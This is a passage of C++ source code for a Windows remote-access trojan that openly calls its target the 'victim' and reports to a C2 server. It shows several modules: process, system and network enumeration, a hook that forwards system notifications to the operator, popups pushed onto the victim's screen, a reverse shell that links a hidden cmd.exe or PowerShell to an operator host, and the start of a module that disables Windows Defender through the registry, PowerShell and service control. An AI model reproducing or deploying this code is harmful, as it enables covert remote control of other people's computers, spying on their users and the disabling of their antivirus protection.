        o["thread_cnt"] = json::Value((double)r.thread_cnt);
        o["session_id"] = json::Value((double)r.session_id);

        // Username of the session that owns the process
        std::string uname = get_session_username(r.session_id);
        o["username"] = json::Value(uname);

        if (r.ph) {
            // ── Full executable path ──────────────────────────────────────
            WCHAR path_buf[MAX_PATH * 2]{}; DWORD path_sz = MAX_PATH * 2;
            if (QueryFullProcessImageNameW(r.ph, 0, path_buf, &path_sz))
                o["exe_path"] = json::Value(wstr_to_str(path_buf));

            // ── Memory ───────────────────────────────────────────────────
            PROCESS_MEMORY_COUNTERS pmc{};
            if (GetProcessMemoryInfo(r.ph, &pmc, sizeof(pmc))) {
                o["mem_kb"]          = json::Value((double)(pmc.WorkingSetSize   / 1024));
                o["page_faults"]     = json::Value((double)pmc.PageFaultCount);
                o["peak_mem_kb"]     = json::Value((double)(pmc.PeakWorkingSetSize / 1024));
            }

            // ── CPU % (two-sample delta) ──────────────────────────────────
            ProcTimes t1 = read_proc_times(r.ph);
            ULONGLONG cpu_delta  = (t1.kernel - r.t0.kernel) + (t1.user - r.t0.user);
            ULONGLONG wall_delta = t1.wall - r.t0.wall;
            double cpu_pct = (wall_delta > 0)
                ? 100.0 * (double)cpu_delta / (double)wall_delta / num_cores
                : 0.0;
            o["cpu_pct"] = json::Value(cpu_pct);

            // ── Command-line arguments ────────────────────────────────────
            std::string cmdline = get_cmdline(r.ph);
            if (!cmdline.empty()) o["cmdline"] = json::Value(cmdline);

            CloseHandle(r.ph);
        }
        procs.push_back(json::Value(o));
    }

    return json::ok_resp({{"count",     json::Value((double)procs.size())},
                           {"processes", json::Value(procs)}});
}

// ── System stats ───────────────────────────────────────────────────────────
static json::Value system_stats(const json::Value&) {
    // CPU via PDH
    double cpu_pct = -1;
    PDH_HQUERY q; PDH_HCOUNTER c;
    if (PdhOpenQueryA(nullptr, 0, &q) == ERROR_SUCCESS) {
        if (PdhAddCounterA(q, "\\Processor(_Total)\\% Processor Time", 0, &c) == ERROR_SUCCESS) {
            PdhCollectQueryData(q);
            Sleep(200);
            PdhCollectQueryData(q);
            PDH_FMT_COUNTERVALUE val;
            if (PdhGetFormattedCounterValue(c, PDH_FMT_DOUBLE, nullptr, &val) == ERROR_SUCCESS)
                cpu_pct = val.doubleValue;
        }
        PdhCloseQuery(q);
    }

    // Memory
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);

    // Disk (first fixed drive)
    ULARGE_INTEGER free_b, total_b, total_free_b;
    GetDiskFreeSpaceExA("C:\\", &free_b, &total_b, &total_free_b);

    json::Object cpu_o;
    cpu_o["percent"] = json::Value(cpu_pct);
    cpu_o["cores"]   = json::Value((double)GetActiveProcessorCount(ALL_PROCESSOR_GROUPS));

    json::Object mem_o;
    mem_o["total_gb"]     = json::Value((double)(ms.ullTotalPhys  / 1073741824.0));
    mem_o["available_gb"] = json::Value((double)(ms.ullAvailPhys  / 1073741824.0));
    mem_o["percent"]      = json::Value((double)(ms.dwMemoryLoad));

    json::Object disk_o;
    disk_o["total_gb"] = json::Value((double)(total_b.QuadPart / 1073741824.0));
    disk_o["free_gb"]  = json::Value((double)(free_b.QuadPart  / 1073741824.0));

    return json::ok_resp({{"cpu",    json::Value(cpu_o)},
                           {"memory", json::Value(mem_o)},
                           {"disk_c", json::Value(disk_o)}});
}

// ── Network connections ────────────────────────────────────────────────────
static json::Value network_connections(const json::Value&) {
    // TCP v4
    DWORD sz = 0;
    GetExtendedTcpTable(nullptr, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    std::vector<BYTE> buf(sz);
    json::Array conns;

    if (GetExtendedTcpTable(buf.data(), &sz, FALSE, AF_INET,
                             TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        auto* t = (MIB_TCPTABLE_OWNER_PID*)buf.data();
        for (DWORD i = 0; i < t->dwNumEntries; ++i) {
            auto& e = t->table[i];
            char la[32], ra[32];
            in_addr a{}; a.S_un.S_addr = e.dwLocalAddr;
            snprintf(la, sizeof(la), "%s:%d", inet_ntoa(a), ntohs((u_short)e.dwLocalPort));
            a.S_un.S_addr = e.dwRemoteAddr;
            snprintf(ra, sizeof(ra), "%s:%d", inet_ntoa(a), ntohs((u_short)e.dwRemotePort));

            json::Object o;
            o["proto"]  = json::Value(std::string("TCP"));
            o["local"]  = json::Value(std::string(la));
            o["remote"] = json::Value(std::string(ra));
            o["pid"]    = json::Value((double)e.dwOwningPid);
            o["state"]  = json::Value((double)e.dwState);
            conns.push_back(json::Value(o));
        }
    }
    return json::ok_resp({{"count", json::Value((double)conns.size())},
                           {"connections", json::Value(conns)}});
}

// ── Top CPU / Mem: reuse process list sorted by mem_kb ────────────────────
static json::Value top_mem(const json::Value& p) {
    json::Value all = list_processes(json::Value{});
    int limit = (int)p["limit"].num(10);
    // Sort descending by mem_kb
    auto& arr = const_cast<json::Array&>(all.obj.at("processes").arr);
    std::sort(arr.begin(), arr.end(), [](const json::Value& a, const json::Value& b){
        return a["mem_kb"].num() > b["mem_kb"].num();
    });
    if ((int)arr.size() > limit) arr.resize(limit);
    return json::ok_resp({{"top_mem", json::Value(arr)}});
}

// ── Background monitor ────────────────────────────────────────────────────
static std::thread  g_mon_thread;
static bool         g_mon_running = false;
static std::mutex   g_snap_mtx;
static json::Array  g_snapshots;

static json::Value start_monitor(const json::Value& p) {
    if (g_mon_running) return json::err_resp("Monitor already running");
    int interval = (int)p["interval"].num(5);
    g_mon_running = true;
    g_mon_thread = std::thread([interval](){
        while (g_mon_running) {
            json::Value snap = system_stats({});
            std::lock_guard<std::mutex> lk(g_snap_mtx);
            g_snapshots.push_back(snap);
            if (g_snapshots.size() > 200) g_snapshots.erase(g_snapshots.begin());
            for (int i = 0; i < interval * 10 && g_mon_running; ++i)
                Sleep(100);
        }
    });
    return json::ok_resp({{"message", json::Value(std::string("Monitor started"))}});
}

static json::Value stop_monitor(const json::Value&) {
    g_mon_running = false;
    if (g_mon_thread.joinable()) g_mon_thread.detach();
    return json::ok_resp({{"message", json::Value(std::string("Monitor stopped"))}});
}

static json::Value get_snapshots(const json::Value& p) {
    int limit = (int)p["limit"].num(10);
    std::lock_guard<std::mutex> lk(g_snap_mtx);
    json::Array out;
    int start = (int)g_snapshots.size() - limit;
    if (start < 0) start = 0;
    for (int i = start; i < (int)g_snapshots.size(); ++i)
        out.push_back(g_snapshots[i]);
    return json::ok_resp({{"count", json::Value((double)out.size())},
                           {"snapshots", json::Value(out)}});
}

json::Value handle(const json::Value& p) {
    std::string action = p["action"].str();
    if (action == "processes")          return list_processes(p);
    if (action == "system_stats")       return system_stats(p);
    if (action == "network_connections") return network_connections(p);
    if (action == "top_mem")            return top_mem(p);
    if (action == "start_monitor")      return start_monitor(p);
    if (action == "stop_monitor")       return stop_monitor(p);
    if (action == "get_snapshots")      return get_snapshots(p);
    return json::err_resp("Unknown activity action: " + action);
}
} // namespace act_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 5 — Notification Monitor
// Hooks WinEvents to intercept system notifications (toast, balloon, dialog)
// and pushes them unsolicited to the server as {"event":"notification",...}.
// ─────────────────────────────────────────────────────────────────────────────
namespace notif_mod {

#pragma comment(lib, "oleaut32.lib")

// Window classes that carry visible notifications
static const char* NOTIF_CLASSES[] = {
    "Windows.UI.Core.CoreWindow",   // Windows 10/11 toast (ShellExperienceHost)
    "tooltips_class32",             // Balloon tips (legacy system tray)
    "NativeHWNDHost",               // Some WinUI-hosted toasts
    "Alternate",                    // Accessibility alert windows
    "#32770",                       // Classic dialog boxes (UAC, errors)
    nullptr
};

// Substrings in title that identify system-level notifications worth reporting
static const char* SYSTEM_TITLES[] = {
    "notification", "alert", "warning", "error", "update",
    "security", "defender", "firewall", "virus", "threat",
    "battery", "network", "sign", "password", "install",
    nullptr
};

static bool title_is_interesting(const std::string& t) {
    if (t.empty()) return false;
    std::string tl = t;
    for (auto& c : tl) c = (char)tolower((unsigned char)c);
    for (int i = 0; SYSTEM_TITLES[i]; ++i)
        if (tl.find(SYSTEM_TITLES[i]) != std::string::npos) return true;
    return false;
}

// Accumulate child window text (title bars, static labels, etc.)
struct EnumCtx { std::string body; int depth; };
static BOOL CALLBACK enum_children(HWND child, LPARAM lp) {
    auto* ctx = reinterpret_cast<EnumCtx*>(lp);
    if (ctx->depth > 3) return FALSE; // don't go too deep
    char txt[512]{};
    if (GetWindowTextA(child, txt, sizeof(txt)) > 0) {
        if (!ctx->body.empty()) ctx->body += " | ";
        ctx->body += txt;
    }
    // Recurse one level deeper
    EnumCtx child_ctx{ctx->body, ctx->depth + 1};
    EnumChildWindows(child, enum_children, (LPARAM)&child_ctx);
    ctx->body = child_ctx.body;
    return TRUE;
}

static std::string extract_body(HWND hwnd) {
    EnumCtx ctx{"", 0};
    EnumChildWindows(hwnd, enum_children, (LPARAM)&ctx);
    return ctx.body;
}

static std::string now_iso() {
    SYSTEMTIME st{}; GetLocalTime(&st);
    char buf[32];
    snprintf(buf, sizeof(buf), "%04d-%02d-%02dT%02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return buf;
}

// ── WinEvent callback (runs on the message-pump thread) ──────────────────────
static void CALLBACK win_event_proc(
    HWINEVENTHOOK, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD, DWORD)
{
    if (!hwnd) return;
    if (idObject != OBJID_WINDOW && idObject != OBJID_CLIENT) return;

    // Get window class
    char cls[256]{};
    GetClassNameA(hwnd, cls, sizeof(cls));

    // Get window title
    char title_buf[512]{};
    GetWindowTextA(hwnd, title_buf, sizeof(title_buf));
    std::string title(title_buf);

    // Determine if we care about this window
    bool class_match = false;
    for (int i = 0; NOTIF_CLASSES[i]; ++i)
        if (strcmp(cls, NOTIF_CLASSES[i]) == 0) { class_match = true; break; }

    // For generic dialog (#32770) only report if title looks system-related
    if (strcmp(cls, "#32770") == 0 && !title_is_interesting(title))
        return;

    if (!class_match) return;
    if (title.empty() && strcmp(cls, "Windows.UI.Core.CoreWindow") != 0)
        return; // skip invisible/unnamed non-toast windows

    // Extract body text from child controls
    std::string body = extract_body(hwnd);

    // Build the push message — no "module"/"payload" wrapper,
    // just a top-level "event" key so the server recognises it as a push.
    json::Object push;
    push["event"]     = json::Value(std::string("notification"));
    push["title"]     = json::Value(title);
    push["body"]      = json::Value(body);
    push["win_class"] = json::Value(std::string(cls));
    push["hwnd"]      = json::Value((double)(ULONG_PTR)hwnd);
    push["timestamp"] = json::Value(now_iso());

    // sock_send is mutex-protected, safe to call from any thread
    sock_send(json::Value(push));
}

// ── State ────────────────────────────────────────────────────────────────────
static HWINEVENTHOOK g_hooks[3]  = {};
static HANDLE        g_msg_thread = nullptr;
static DWORD         g_msg_tid    = 0;
static bool          g_running    = false;

// ── Message-pump thread (required for WinEvent hooks) ────────────────────────
static DWORD WINAPI msg_pump(LPVOID) {
    // Install hooks from this thread so they share its message queue
    g_hooks[0] = SetWinEventHook(
        EVENT_SYSTEM_ALERT, EVENT_SYSTEM_ALERT,
        nullptr, win_event_proc, 0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_ALLPROCESSES);

    g_hooks[1] = SetWinEventHook(
        EVENT_OBJECT_SHOW, EVENT_OBJECT_SHOW,
        nullptr, win_event_proc, 0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_ALLPROCESSES);

    g_hooks[2] = SetWinEventHook(
        EVENT_OBJECT_NAMECHANGE, EVENT_OBJECT_NAMECHANGE,
        nullptr, win_event_proc, 0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_ALLPROCESSES);

    // Run the message pump until WM_QUIT
    MSG msg;
    while (g_running && GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook on exit
    for (auto& h : g_hooks) { if (h) { UnhookWinEvent(h); h = nullptr; } }
    return 0;
}

// ── Public API ───────────────────────────────────────────────────────────────
json::Value handle(const json::Value& p) {
    std::string action = p["action"].str();

    if (action == "start") {
        if (g_running)
            return json::err_resp("Notification monitor already running");
        g_running    = true;
        g_msg_thread = CreateThread(nullptr, 0, msg_pump, nullptr, 0, &g_msg_tid);
        if (!g_msg_thread) {
            g_running = false;
            return json::err_resp("CreateThread failed: " + std::to_string(GetLastError()));
        }
        return json::ok_resp({{"message",
            json::Value(std::string("Notification monitor started — "
                "alerts will be pushed in real-time"))}});
    }

    if (action == "stop") {
        if (!g_running)
            return json::err_resp("Notification monitor is not running");
        g_running = false;
        if (g_msg_tid) PostThreadMessageA(g_msg_tid, WM_QUIT, 0, 0);
        if (g_msg_thread) { WaitForSingleObject(g_msg_thread, 2000); CloseHandle(g_msg_thread); }
        g_msg_thread = nullptr; g_msg_tid = 0;
        return json::ok_resp({{"message", json::Value(std::string("Notification monitor stopped"))}});
    }

    if (action == "status") {
        return json::ok_resp({{"running", json::Value(g_running)}});
    }

    // ── Outbound: show a MessageBox popup on the victim ───────────────────
    if (action == "send_popup") {
        std::string title = p["title"].str("C2 Message");
        std::string body  = p["body"].str();
        std::string type  = p["type"].str("info");   // info | warning | error

        // Convert UTF-8 → wide for the MessageBox API
        auto to_wide = [](const std::string& s) -> std::wstring {
            if (s.empty()) return L"";
            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
            std::wstring w(n - 1, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
            return w;
        };

        UINT mb_flags = MB_OK | MB_TOPMOST | MB_SETFOREGROUND;
        if      (type == "warning") mb_flags |= MB_ICONWARNING;
        else if (type == "error")   mb_flags |= MB_ICONERROR;
        else                        mb_flags |= MB_ICONINFORMATION;

        // Run in a detached thread — MessageBox blocks until the user clicks OK
        struct PopupCtx { std::wstring title, body; UINT flags; };
        auto* ctx  = new PopupCtx{ to_wide(title), to_wide(body), mb_flags };

        HANDLE t = CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
            auto* c = static_cast<PopupCtx*>(p);
            MessageBoxW(nullptr, c->body.c_str(), c->title.c_str(), c->flags);
            delete c;
            return 0;
        }, ctx, 0, nullptr);

        if (t) CloseHandle(t);
        return json::ok_resp({{"message",
            json::Value(std::string("Popup sent: ") + title)}});
    }

    // ── Outbound: show a system-tray balloon tip on the victim ────────────
    if (action == "send_balloon") {
        std::string title   = p["title"].str("C2 Message");
        std::string body    = p["body"].str();
        std::string type    = p["type"].str("info");   // info | warning | error
        int         timeout = (int)p["timeout_ms"].num(5000);

        auto to_wide = [](const std::string& s, size_t limit) -> std::wstring {
            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
            std::wstring w(n - 1, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
            if (w.size() > limit) w.resize(limit);
            return w;
        };

        DWORD niif = NIIF_NOSOUND;
        if      (type == "warning") niif |= NIIF_WARNING;
        else if (type == "error")   niif |= NIIF_ERROR;
        else                        niif |= NIIF_INFO;

        // Balloon tips require a window handle — create a tiny hidden one
        struct BalloonCtx {
            std::wstring title, body;
            DWORD niif;
            int timeout_ms;
        };
        auto* ctx = new BalloonCtx{
            to_wide(title, 63),   // NOTIFYICONDATA.szInfoTitle max 64 chars
            to_wide(body,  255),  // NOTIFYICONDATA.szInfo      max 256 chars
            niif, timeout
        };

        HANDLE t = CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
            auto* c = static_cast<BalloonCtx*>(p);

            // Register a minimal hidden window class
            static const wchar_t* CLS = L"C2BalloonWnd";
            WNDCLASSEXW wc{};
            wc.cbSize        = sizeof(wc);
            wc.lpfnWndProc   = DefWindowProcW;
            wc.hInstance     = GetModuleHandleW(nullptr);
            wc.lpszClassName = CLS;
            RegisterClassExW(&wc); // ignore failure if already registered

            HWND hwnd = CreateWindowExW(0, CLS, L"", WS_POPUP,
                                        0, 0, 0, 0, nullptr, nullptr,
                                        GetModuleHandleW(nullptr), nullptr);
            if (!hwnd) { delete c; return 1; }

            // Add a tray icon (invisible — we just need a handle)
            NOTIFYICONDATAW nid{};
            nid.cbSize           = sizeof(nid);
            nid.hWnd             = hwnd;
            nid.uID              = 0xC2C2;
            nid.uFlags           = NIF_ICON | NIF_TIP | NIF_INFO | NIF_MESSAGE;
            nid.uCallbackMessage = WM_USER + 1;
            nid.hIcon            = LoadIconW(nullptr, MAKEINTRESOURCEW(32512)); // IDI_APPLICATION
            nid.dwInfoFlags      = c->niif;
            nid.uTimeout         = (UINT)c->timeout_ms;
            wcsncpy_s(nid.szTip,       L"C2 Agent", 8);
            wcsncpy_s(nid.szInfoTitle, c->title.c_str(), 63);
            wcsncpy_s(nid.szInfo,      c->body.c_str(),  255);

            Shell_NotifyIconW(NIM_ADD,    &nid);
            Shell_NotifyIconW(NIM_MODIFY, &nid);  // triggers the balloon

            // Keep the icon alive long enough for the balloon to show
            Sleep((DWORD)c->timeout_ms + 1000);
            Shell_NotifyIconW(NIM_DELETE, &nid);
            DestroyWindow(hwnd);
            delete c;
            return 0;
        }, ctx, 0, nullptr);

        if (t) CloseHandle(t);
        return json::ok_resp({{"message",
            json::Value(std::string("Balloon sent: ") + title)}});
    }

    return json::err_resp("Unknown notify action: " + action
                          + ". Use: start | stop | status | send_popup | send_balloon");
}

void cleanup() {
    if (g_running) handle([]{ json::Object o; o["action"] = json::Value(std::string("stop")); return json::Value(o); }());
}

} // namespace notif_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 6 — Reverse Shell
// Spawns cmd.exe (or powershell.exe) and connects its stdin/stdout/stderr
// directly back to the operator over a raw TCP socket.
// Traffic bypasses the C2 server for speed — the JSON channel is only used
// for the start/stop/status control commands.
// ─────────────────────────────────────────────────────────────────────────────
namespace shell_mod {

struct ShellState {
    HANDLE proc    = nullptr;           // shell process handle
    HANDLE h_in    = nullptr;           // write end → shell stdin
    HANDLE h_out   = nullptr;           // read end  ← shell stdout+stderr
    SOCKET sock    = INVALID_SOCKET;    // raw socket to operator
    HANDLE t_in    = nullptr;           // relay thread: socket → shell
    HANDLE t_out   = nullptr;           // relay thread: shell   → socket
    bool   running = false;
    DWORD  pid     = 0;
};

static ShellState g_sh;
static std::mutex g_sh_mtx;

// ── Relay thread: operator keystrokes → shell stdin ──────────────────────────
static DWORD WINAPI thr_sock_to_shell(LPVOID) {
    char buf[4096];
    while (g_sh.running) {
        int n = recv(g_sh.sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        DWORD written = 0;
        if (!WriteFile(g_sh.h_in, buf, (DWORD)n, &written, nullptr)) break;
    }
    // Connection dropped — kill the shell so the other thread also exits
    if (g_sh.proc) TerminateProcess(g_sh.proc, 0);
    return 0;
}

// ── Relay thread: shell stdout/stderr → operator socket ──────────────────────
static DWORD WINAPI thr_shell_to_sock(LPVOID) {
    char buf[4096];
    DWORD n = 0;
    while (g_sh.running) {
        if (!ReadFile(g_sh.h_out, buf, sizeof(buf), &n, nullptr) || n == 0) break;
        if (send(g_sh.sock, buf, (int)n, 0) == SOCKET_ERROR) break;
    }
    g_sh.running = false;
    // Close socket so the operator's listener sees EOF
    if (g_sh.sock != INVALID_SOCKET) {
        shutdown(g_sh.sock, SD_BOTH);
        closesocket(g_sh.sock);
        g_sh.sock = INVALID_SOCKET;
    }
    return 0;
}

// ── Start ─────────────────────────────────────────────────────────────────────
static json::Value do_start(const json::Value& p) {
    std::string lhost     = p["lhost"].str();
    int         lport     = (int)p["lport"].num(4445);
    std::string shell_exe = p["shell"].str("cmd.exe");  // or powershell.exe

    if (lhost.empty()) return json::err_resp("lhost is required");

    // ── Pipes ──────────────────────────────────────────────────────────────
    SECURITY_ATTRIBUTES sa{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    HANDLE r_stdin = nullptr, w_stdin = nullptr;
    HANDLE r_stdout = nullptr, w_stdout = nullptr;

    if (!CreatePipe(&r_stdin,  &w_stdin,  &sa, 0) ||
        !CreatePipe(&r_stdout, &w_stdout, &sa, 0))
        return json::err_resp("CreatePipe failed: " + std::to_string(GetLastError()));

    // Operator-side ends must NOT be inherited
    SetHandleInformation(w_stdin,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r_stdout, HANDLE_FLAG_INHERIT, 0);

    // ── Spawn shell ────────────────────────────────────────────────────────
    STARTUPINFOW si{};
    si.cb          = sizeof(si);
    si.hStdInput   = r_stdin;
    si.hStdOutput  = w_stdout;
    si.hStdError   = w_stdout;          // merge stderr → stdout
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::wstring wshell(shell_exe.begin(), shell_exe.end());
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, &wshell[0], nullptr, nullptr,
                        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(r_stdin);  CloseHandle(w_stdin);
        CloseHandle(r_stdout); CloseHandle(w_stdout);
        return json::err_resp("CreateProcess(" + shell_exe + ") failed: "
                              + std::to_string(GetLastError()));
    }
    CloseHandle(pi.hThread);
    CloseHandle(r_stdin);   // now owned by child
    CloseHandle(w_stdout);  // now owned by child

    // ── Connect directly to operator's listener ────────────────────────────
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(lhost.c_str(), std::to_string(lport).c_str(), &hints, &res) != 0 || !res) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        CloseHandle(w_stdin); CloseHandle(r_stdout); closesocket(sock);
        return json::err_resp("DNS resolution failed for: " + lhost);
    }

    // Short timeout for the initial connect; remove it after (shell is long-lived)
    DWORD to_ms = 8000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&to_ms, sizeof(to_ms));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&to_ms, sizeof(to_ms));

    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) != 0) {
        freeaddrinfo(res);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        CloseHandle(w_stdin); CloseHandle(r_stdout); closesocket(sock);
        return json::err_resp("TCP connect failed to " + lhost + ":"
                              + std::to_string(lport));
    }
    freeaddrinfo(res);

    DWORD zero = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&zero, sizeof(zero));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&zero, sizeof(zero));

    // ── Store state + start relay threads ─────────────────────────────────
    g_sh.proc    = pi.hProcess;
    g_sh.pid     = pi.dwProcessId;
    g_sh.h_in    = w_stdin;
    g_sh.h_out   = r_stdout;
    g_sh.sock    = sock;
    g_sh.running = true;

    g_sh.t_in  = CreateThread(nullptr, 0, thr_sock_to_shell, nullptr, 0, nullptr);
    g_sh.t_out = CreateThread(nullptr, 0, thr_shell_to_sock, nullptr, 0, nullptr);

    return json::ok_resp({
        {"message", json::Value(std::string("Reverse shell → ") + lhost
                                + ":" + std::to_string(lport))},
        {"pid",     json::Value((double)g_sh.pid)},
        {"shell",   json::Value(shell_exe)},
    });
}

// ── Stop ──────────────────────────────────────────────────────────────────────
static json::Value do_stop() {
    if (!g_sh.running) return json::err_resp("No active shell");
    g_sh.running = false;
    if (g_sh.proc) {
        TerminateProcess(g_sh.proc, 0);
        WaitForSingleObject(g_sh.proc, 2000);
        CloseHandle(g_sh.proc); g_sh.proc = nullptr;
    }
    if (g_sh.sock != INVALID_SOCKET) {
        shutdown(g_sh.sock, SD_BOTH);
        closesocket(g_sh.sock); g_sh.sock = INVALID_SOCKET;
    }
    if (g_sh.h_in)  { CloseHandle(g_sh.h_in);  g_sh.h_in  = nullptr; }
    if (g_sh.h_out) { CloseHandle(g_sh.h_out); g_sh.h_out = nullptr; }
    if (g_sh.t_in)  { WaitForSingleObject(g_sh.t_in,  1000); CloseHandle(g_sh.t_in);  g_sh.t_in  = nullptr; }
    if (g_sh.t_out) { WaitForSingleObject(g_sh.t_out, 1000); CloseHandle(g_sh.t_out); g_sh.t_out = nullptr; }
    g_sh.pid = 0;
    return json::ok_resp({{"message", json::Value(std::string("Shell terminated"))}});
}

// ── Public API ────────────────────────────────────────────────────────────────
json::Value handle(const json::Value& p) {
    std::string action = p["action"].str();
    std::lock_guard<std::mutex> lk(g_sh_mtx);

    if (action == "start") {
        if (g_sh.running) return json::err_resp("Shell already running — stop it first");
        return do_start(p);
    }
    if (action == "stop")   return do_stop();
    if (action == "status") {
        bool alive = g_sh.running;
        // Double-check: process may have exited on its own
        if (alive && g_sh.proc) {
            DWORD ec = STILL_ACTIVE;
            if (GetExitCodeProcess(g_sh.proc, &ec) && ec != STILL_ACTIVE) {
                do_stop(); alive = false;
            }
        }
        return json::ok_resp({
            {"running", json::Value(alive)},
            {"pid",     json::Value((double)g_sh.pid)},
        });
    }
    return json::err_resp("Unknown shell action: " + action
                          + ". Use: start | stop | status");
}

void cleanup() {
    std::lock_guard<std::mutex> lk(g_sh_mtx);
    if (g_sh.running) do_stop();
}

} // namespace shell_mod


// ─────────────────────────────────────────────────────────────────────────────
// Module 7 — Windows Defender Controller
// Disable / enable Defender using layered methods:
//   1. Tamper Protection registry (SYSTEM-level, may fail w/o SYSTEM token)
//   2. Policy registry keys        (admin, persistent across reboots)
//   3. Real-Time Protection keys   (admin, immediate registry flag)
//   4. PowerShell Set-MpPreference (admin, immediate API call)
//   5. SCM: stop + disable WinDefend & WdNisSvc services
// Each step is attempted independently; per-step success is reported.
// ─────────────────────────────────────────────────────────────────────────────
namespace defender_mod {

// ── Low-level helpers ─────────────────────────────────────────────────────────

// Spawn a process hidden and wait for it; optionally capture exit code.
static bool run_hidden(const std::string& cmd_utf8, DWORD* ec_out = nullptr,
                       DWORD timeout_ms = 20000) {
    int wn = MultiByteToWideChar(CP_UTF8, 0, cmd_utf8.c_str(), -1, nullptr, 0);
    std::wstring wcmd(wn - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, cmd_utf8.c_str(), -1, &wcmd[0], wn);

    STARTUPINFOW si{};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, &wcmd[0], nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    WaitForSingleObject(pi.hProcess, timeout_ms);
    if (ec_out) GetExitCodeProcess(pi.hProcess, ec_out);
    CloseHandle(pi.hProcess);
    return true;
}

// Helper: run powershell command hidden, return true on exit-code 0
static bool run_ps(const std::string& ps_cmd) {
    DWORD ec = 1;
    run_hidden("powershell.exe -NonInteractive -WindowStyle Hidden "
               "-ExecutionPolicy Bypass -Command \"" + ps_cmd + "\"", &ec);
    return ec == 0;
}

// Set a registry DWORD, creating the key if needed
static bool reg_set(HKEY root, const char* sub, const char* name, DWORD val) {
    HKEY hk; DWORD disp;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, &disp) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_DWORD,
                             (const BYTE*)&val, sizeof(val)) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

// Delete a registry DWORD value
static bool reg_del(HKEY root, const char* sub, const char* name) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return false;
    bool ok = RegDeleteValueA(hk, name) == ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}

// Read a registry DWORD (-1 = absent/error)
static int reg_get(HKEY root, const char* sub, const char* name) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) return -1;
    DWORD val = 0, sz = sizeof(val), type;
    bool ok = RegQueryValueExA(hk, name, nullptr, &type,
                               (BYTE*)&val, &sz) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok ? (int)val : -1;
}

// Enumerate registry value names under a key
static json::Array reg_enum_values(HKEY root, const char* sub) {
    json::Array arr;
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) return arr;
    char nm[2048]; DWORD nm_sz = sizeof(nm);
    for (DWORD i = 0;
         RegEnumValueA(hk, i, nm, &nm_sz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS;
         ++i, nm_sz = sizeof(nm))
        arr.push_back(json::Value(std::string(nm)));
    RegCloseKey(hk);
    return arr;
}

// Query a service's current state as a string
static std::string svc_state(const char* name) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return "access_denied";
    SC_HANDLE svc = OpenServiceA(scm, name, SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return "not_found"; }
    SERVICE_STATUS ss{};
    QueryServiceStatus(svc, &ss);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    switch (ss.dwCurrentState) {
        case SERVICE_RUNNING:       return "running";
        case SERVICE_STOPPED:       return "stopped";
        case SERVICE_PAUSED:        return "paused";
        case SERVICE_START_PENDING: return "starting";
        case SERVICE_STOP_PENDING:  return "stopping";
        default: return "unknown";
    }
}

// Stop + optionally disable a service, returns true if stop was accepted
static bool svc_stop_disable(const char* name, bool disable = true) {
